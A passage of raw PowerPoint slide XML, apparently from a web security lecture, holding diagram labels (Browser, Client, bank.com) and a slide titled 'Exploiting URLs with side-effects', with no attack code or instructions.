          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2151529"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77832" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2465295" y="5213537"/>
            <a:ext cx="1881188" cy="1495985"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77833" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2480703" y="5244353"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77834" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2480703" y="5244353"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2586990"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T5" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2586990"/>
              <a:gd name="T7" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2586990"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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86990" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2586685" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2586685" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77835" name="object 24"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2638986" y="5727608"/>
            <a:ext cx="1383926" cy="3590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11113">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2780"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2118" b="1">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="4" name="Straight Arrow Connector 3"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="77827" idx="2"/>
            <a:endCxn id="77832" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3405188" y="4000500"/>
            <a:ext cx="37819" cy="121303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77837" name="TextBox 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3546662" y="4438931"/>
            <a:ext cx="1534779" cy="472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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2471">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>connected</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="227697670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78449" y="191902"/>
            <a:ext cx="7433703" cy="611065"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3971" spc="18" dirty="0"/>
              <a:t>Exploiting </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-63" dirty="0"/>
              <a:t>URLs </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-4" dirty="0"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="14" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="27" dirty="0"/>
              <a:t>side-effects</a:t>
            </a:r>
            <a:endParaRPr sz="3971"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78851" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2795868" y="2608170"/>
            <a:ext cx="1294279" cy="1392331"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
